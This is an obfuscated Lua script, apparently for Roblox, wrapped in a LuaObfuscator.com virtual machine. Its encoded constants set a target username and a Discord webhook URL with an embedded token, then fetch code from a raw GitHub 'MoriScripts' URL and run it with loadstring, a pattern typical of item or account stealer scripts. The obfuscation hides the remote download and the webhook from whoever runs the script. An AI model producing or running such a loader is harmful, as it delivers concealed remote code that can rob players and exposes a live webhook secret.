--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.16) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then v19=v0(v3(v30,1,1));return "";else local v80=0;local v81;while true do if (v80==0) then v81=v2(v0(v30,16));if v19 then local v96=v5(v81,v19);v19=nil;return v96;else return v81;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v82=(v31/((5 -3)^(v32-(2 -1))))%((3 -1)^(((v33-(2 -1)) -(v32-(620 -(555 + 11 + 53)))) + (932 -(857 + (951 -(282 + 595)))))) ;return v82-(v82%(569 -(367 + 201))) ;else local v83=2^(v32-(928 -(214 + 713))) ;return (((v31%(v83 + v83))>=v83) and 1) or (0 + 0) ;end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35,v36=v1(v16,v18,v18 + (1639 -(1523 + 114)) );v18=v18 + 2 + 0 ;return (v36 * 256) + v35 ;end local function v23()local v37,v38,v39,v40=v1(v16,v18,v18 + (3 -0) );v18=v18 + (1069 -(68 + 997)) ;return (v40 * (16778486 -(222 + 4 + 1044))) + (v39 * (285370 -219834)) + (v38 * (373 -(32 + 85))) + v37 ;end local function v24()local v41=0 + 0 ;local v42;local v43;local v44;local v45;local v46;local v47;while true do if (v41==(957 -(892 + 65))) then v42=v23();v43=v23();v41=1;end if (v41==(7 -4)) then if (v46==(0 -(0 + 0))) then if (v45==((0 -0) -0)) then return v47 * (350 -(87 + 263)) ;else v46=1;v44=180 -(67 + 113) ;end elseif (v46==2047) then return ((v45==((18 -(10 + 8)) + 0)) and (v47 * ((2 -1)/((0 -0) + 0)))) or (v47 * NaN) ;end return v8(v47,v46-(4065 -(4528 -(998 + 488))) ) * (v44 + (v45/((954 -((1244 -(416 + 26)) + 150))^(139 -87)))) ;end if (v41==((1 + 2) -1)) then v46=v20(v43,16 + 5 ,1028 -(915 + 82) );v47=((v20(v43,90 -58 )==(1 + 0)) and  -(1 -0)) or (1188 -(876 + 193 + (376 -258))) ;v41=(778 -(201 + 571)) -3 ;end if (v41==(1 -0)) then v44=1 + 0 ;v45=(v20(v43,1 -0 ,20 + 0 ) * (2^((1961 -(116 + 1022)) -(368 + 423)))) + v42 ;v41=6 -(16 -12) ;end end end local function v25(v48)local v49=0 + 0 ;local v50;local v51;while true do if (v49==((1749 -(760 + 987)) + 1)) then return v6(v51);end if (v49==(3 -1)) then v51={};for v89=3 -2 , #v50 do v51[v89]=v2(v1(v3(v50,v89,v89)));end v49=1426 -(630 + 793) ;end if (v49==(0 -0)) then v50=nil;if  not v48 then v48=v23();if (v48==(859 -(814 + 45))) then return "";end end v49=2 -1 ;end if (v49==(1 + 0)) then v50=v3(v16,v18,(v18 + v48) -(1 + 0) );v18=v18 + v48 ;v49=6 -4 ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v52=1274 -(388 + 886) ;local v53;local v54;local v55;local v56;local v57;local v58;local v59;while true do if (v52~=(3 -0)) then else v59=nil;while true do local v91=0 + 0 ;while true do if (1==v91) then if (v53~=2) then else for v99=1 + 0 ,v23() do local v100=0;local v101;local v102;local v103;while true do if (v100~=1) then else v103=nil;while true do if (v101==(561 -(306 + 254))) then while true do if ((0 + 0)==v102) then v103=v21();if (v20(v103,1 -0 ,1468 -(899 + 568) )==(1130 -(369 + 761))) then local v178=0 + 0 ;local v179;local v180;local v181;local v182;local v183;while true do if (v178==(1 -0)) then v181=nil;v182=nil;v178=2 + 0 ;end if (v178==2) then v183=nil;while true do if (v179==(3 -1)) then while true do if ((4 -2)==v180) then local v191=603 -(268 + 335) ;while true do if (v191~=(0 + 0)) then else local v198=0;local v199;while true do if (v198~=0) then else v199=290 -(60 + 230) ;while true do if (v199==0) then if (v20(v182,573 -(426 + 146) ,1)==(337 -(144 + 192))) then v183[1 + 1 ]=v59[v183[1458 -(282 + 1174) ]];end if (v20(v182,2 + 0 ,813 -(569 + 242) )~=(2 -1)) then else v183[2 + 1 ]=v59[v183[1 + 2 ]];end v199=1025 -(706 + 318) ;end if (v199==(1581 -(1183 + 397))) then v191=1252 -(721 + 530) ;break;end end break;end end end if (v191~=(1272 -(945 + 326))) then else v180=7 -4 ;break;end end end if (v180==(1 + 0)) then local v192=700 -(271 + 429) ;while true do if (v192==1) then v180=2;break;end if (v192==(0 + 0)) then local v200=1500 -(1408 + 92) ;while true do if ((1086 -(461 + 625))~=v200) then else v183={v22(),v22(),nil,nil};if (v181==0) then local v201=0 + 0 ;local v202;while true do if (v201==(1171 -(418 + 753))) then v202=0 + 0 ;while true do if (v202==(0 + 0)) then v183[1664 -(1477 + 184) ]=v22();v183[2 + 2 ]=v22();break;end end break;end end elseif (v181==(1 + 0)) then v183[3]=v23();elseif (v181==(2 + 0)) then v183[532 -(406 + 123) ]=v23() -((1771 -(1749 + 20))^(48 -32)) ;elseif (v181==(307 -(244 + 60))) then local v211=0 + 0 ;local v212;local v213;while true do if (1~=v211) then else while true do if (v212==(0 + 0)) then v213=1001 -(938 + 63) ;while true do if (v213~=0) then else v183[1325 -(1249 + 73) ]=v23() -((1 + 1)^(1161 -(466 + 679))) ;v183[9 -5 ]=v22();break;end end break;end end break;end if (v211==0) then v212=0;v213=nil;v211=2 -1 ;end end end v200=1901 -(106 + 1794) ;end if (1==v200) then v192=1614 -(1565 + 48) ;break;end end end end end if (v180~=(1 + 2)) then else if (v20(v182,2 + 1 ,3)==(1139 -(782 + 356))) then v183[2 + 2 ]=v59[v183[4]];end v54[v99]=v183;break;end if (v180==(267 -(176 + 91))) then local v194=0 -0 ;while true do if (v194==1) then v180=1;break;end if (v194==(0 -0)) then v181=v20(v103,116 -(4 + 110) ,587 -(57 + 527) );v182=v20(v103,1431 -(41 + 1386) ,1881 -(157 + 1718) );v194=104 -(17 + 86) ;end end end end break;end if (v179~=1) then else local v187=0 + 0 ;while true do if ((1 -0)==v187) then v179=5 -3 ;break;end if (v187==0) then local v195=166 -(122 + 44) ;while true do if (v195==(1 -0)) then v187=3 -2 ;break;end if (v195==(0 -0)) then v182=nil;v183=nil;v195=1 + 0 ;end end end end end if (v179~=0) then else local v188=0 + 0 ;local v189;while true do if (v188==(0 -0)) then v189=0;while true do if ((0 -0)==v189) then v180=65 -(30 + 35) ;v181=nil;v189=1 + 0 ;end if (v189~=(1258 -(1043 + 214))) then else v179=2 -1 ;break;end end break;end end end end break;end if (v178==0) then v179=1227 -(322 + 905) ;v180=nil;v178=612 -(602 + 9) ;end end end break;end end break;end if (v101~=(1189 -(449 + 740))) then else v102=0 -0 ;v103=nil;v101=1213 -(323 + 889) ;end end break;end if (v100==0) then v101=0 -0 ;v102=nil;v100=2 -1 ;end end end for v104=1 + 0 ,v23() do v55[v104-(581 -(361 + 219)) ]=v28();end return v57;end break;end if (v91==0) then if (v53==0) then local v97=320 -(53 + 267) ;while true do if (v97==(1899 -(260 + 1638))) then v56={};v57={v54,v55,nil,v56};v97=3 -1 ;end if (v97==2) then v53=2 -1 ;break;end if (v97==(1205 -(902 + 303))) then v54={};v55={};v97=3 -2 ;end end end if (v53==1) then local v98=0 + 0 ;while true do if (v98~=(0 -0)) then else v58=v23();v59={};v98=1 + 0 ;end if (v98==1) then for v146=1,v58 do local v147=0;local v148;local v149;local v150;local v151;local v152;while true do if (v147==(850 -(20 + 830))) then v148=0 + 0 ;v149=nil;v147=215 -(22 + 192) ;end if (v147==(685 -(483 + 200))) then v152=nil;while true do if (v148==(126 -(116 + 10))) then local v176=0 + 0 ;while true do if (v176~=0) then else v149=0 -0 ;v150=nil;v176=1 -0 ;end if ((739 -(542 + 196))==v176) then v148=563 -(334 + 228) ;break;end end end if (v148~=(3 -2)) then else local v177=0 -0 ;while true do if (v177~=(1 -0)) then else v148=1 + 1 ;break;end if ((0 + 0)~=v177) then else v151=nil;v152=nil;v177=1 + 0 ;end end end if ((238 -(141 + 95))==v148) then while true do if ((0 + 0)==v149) then local v184=0;while true do if (v184~=1) then else v149=1 + 0 ;break;end if ((0 -0)~=v184) then else v150=0;v151=nil;v184=2 -1 ;end end end if (v149~=1) then else v152=nil;while true do if (v150==1) then if (v151==1) then v152=v21()~=(1551 -(1126 + 425)) ;elseif (v151==(407 -(118 + 287))) then v152=v24();elseif (v151==(11 -8)) then v152=v25();end v59[v146]=v152;break;end if (v150==(1121 -(118 + 1003))) then local v186=0 -0 ;while true do if ((377 -(142 + 235))==v186) then local v190=0 + 0 ;while true do if (v190==(4 -3)) then v186=1 + 0 ;break;end if (v190~=(977 -(553 + 424))) then else v151=v21();v152=nil;v190=1;end end end if (v186~=1) then else v150=1 -0 ;break;end end end end break;end end break;end end break;end if (v147==(1 -0)) then v150=nil;v151=nil;v147=2 + 0 ;end end end v57[3 + 0 ]=v21();v98=2 + 0 ;end if (v98~=(1 + 1)) then else v53=2;break;end end end v91=1 + 0 ;end end end break;end if (v52~=1) then else local v87=0 + 0 ;while true do if (v87==(2 -1)) then v52=2;break;end if (v87==(0 -0)) then v55=nil;v56=nil;v87=2 -1 ;end end end if (v52==(0 + 0)) then local v88=0 -0 ;while true do if ((0 -0)~=v88) then else v53=753 -(239 + 514) ;v54=nil;v88=1 + 0 ;end if (v88==(1 -0)) then v52=1;break;end end end if (v52==(1792 -(573 + 1217))) then v57=nil;v58=nil;v52=1332 -(797 + 532) ;end end end local function v29(v60,v61,v62)local v63=v60[1];local v64=v60[2];local v65=v60[3];return function(...)local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=1;local v71= -1;local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v84=0,v74 do if (v84>=v68) then v72[v84-v68 ]=v73[v84 + 1 ];else v76[v84]=v73[v84 + 1 ];end end local v77=(v74-v68) + 1 ;local v78;local v79;while true do v78=v66[v70];v79=v78[1];if (v79<=11) then if (v79<=5) then if (v79<=2) then if (v79<=0) then v70=v78[3];elseif (v79>1) then v76[v78[2]]=v78[3]~=0 ;else v76[v78[2]]();end elseif (v79<=3) then for v120=v78[2],v78[3] do v76[v120]=nil;end elseif (v79==4) then v76[v78[2]]=v62[v78[3]];else do return;end end elseif (v79<=8) then if (v79<=6) then local v107=0;local v108;local v109;local v110;local v111;while true do if (1==v107) then v71=(v110 + v108) -1 ;v111=0;v107=2;end if (v107==2) then for v162=v108,v71 do v111=v111 + 1 ;v76[v162]=v109[v111];end break;end if (v107==0) then v108=v78[2];v109,v110=v69(v76[v108](v13(v76,v108 + 1 ,v78[3])));v107=1;end end elseif (v79>7) then v76[v78[2]]=v78[3];else v76[v78[2]]=v78[3]~=0 ;end elseif (v79<=9) then for v122=v78[2],v78[3] do v76[v122]=nil;end elseif (v79>10) then do return;end else local v131=0;local v132;while true do if (v131==0) then v132=v78[2];v76[v132]=v76[v132](v13(v76,v132 + 1 ,v71));break;end end end elseif (v79<=17) then if (v79<=14) then if (v79<=12) then local v112=0;local v113;local v114;while true do if (v112==0) then v113=v78[2];v114=v76[v78[3]];v112=1;end if (v112==1) then v76[v113 + 1 ]=v114;v76[v113]=v114[v78[4]];break;end end elseif (v79>13) then local v133=0;local v134;local v135;while true do if (v133==1) then v76[v134 + 1 ]=v135;v76[v134]=v135[v78[4]];break;end if (v133==0) then v134=v78[2];v135=v76[v78[3]];v133=1;end end elseif (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end elseif (v79<=15) then v70=v78[3];elseif (v79==16) then local v136=v78[2];local v137,v138=v69(v76[v136](v13(v76,v136 + 1 ,v78[3])));v71=(v138 + v136) -1 ;local v139=0;for v159=v136,v71 do v139=v139 + 1 ;v76[v159]=v137[v139];end else local v140=0;local v141;while true do if (v140==0) then v141=v78[2];v76[v141]=v76[v141](v13(v76,v141 + 1 ,v71));break;end end end elseif (v79<=20) then if (v79<=18) then v76[v78[2]]=v62[v78[3]];elseif (v79>19) then v76[v78[2]]();else v62[v78[3]]=v76[v78[2]];end elseif (v79<=21) then v76[v78[2]]=v78[3];elseif (v79>22) then if (v76[v78[2]]==v78[4]) then v70=v70 + 1 ;else v70=v78[3];end else v62[v78[3]]=v76[v78[2]];end v70=v70 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0B3O00028O00026O00F03F03093O00557365724E616D6532030F3O0074726963657261746F70735F647165030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403463O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F4C7970686572582F4D6F7269536372697074732F6D61696E2F4D6F72695363726970747303083O00557365724E616D6503073O00576562682O6F6B03793O00682O7470733A2O2F646973636F72642E636F6D2F6170692F776562682O6F6B732F2O31363531303639343237383435382O3931342F4A3746745A703350346A374D614648533734773036712D46595A4D55463262354C734461472O664C6B75574A5A426A5A73643366456F334C5834786C6B595A593251413900253O0012153O00014O0003000100013O00260D3O00020001000100040F3O00020001001215000100013O00260D000100120001000200040F3O00120001001215000200043O001213000200033O002O12000200053O002O12000300063O00200C000300030007001215000500084O0002000600014O0010000300064O001100023O00022O000100020001000100040F3O0024000100260D000100050001000100040F3O00050001001215000200013O00260D0002001C0001000100040F3O001C0001001215000300043O001213000300093O0012150003000B3O0012130003000A3O001215000200023O00260D000200150001000200040F3O00150001001215000100023O00040F3O0005000100040F3O0015000100040F3O0005000100040F3O0024000100040F3O000200012O00053O00017O00",v9(),...);